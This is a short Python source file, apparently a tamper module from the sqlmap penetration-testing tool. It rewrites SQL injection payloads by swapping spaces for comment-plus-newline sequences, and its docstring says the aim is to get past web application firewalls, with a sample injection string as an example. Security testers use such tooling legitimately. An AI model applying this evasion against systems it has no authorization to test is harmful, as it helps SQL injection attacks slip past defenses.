#!/usr/bin/env python

"""
Copyright (c) 2006-2012 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import os

from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS, PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    singleTimeWarnMessage(u"tamper script '%s' is only meant to be run against %s" % (
    os.path.basename(__file__).split(".")[0], DBMS.MYSQL))


def tamper(payload, **kwargs):
    """
    Replaces space character (' ') with a dash comment ('--') followed by
    a new line ('\n')

    Example:
        * Input: 1 AND 9227=9227
        * Output: 1--%0AAND--%0A9227=9227

    Requirement:
        * MySQL
        * MSSQL

    Tested against:

    Notes:
        * Useful to bypass several web application firewalls.
    """

    retVal = ""

    if payload:
        for i in xrange(len(payload)):
            if payload[i].isspace():
                retVal += "--%0A"
            elif payload[i] == '#' or payload[i:i + 3] == '-- ':
                retVal += payload[i:]
                break
            else:
                retVal += payload[i]

    return retVal
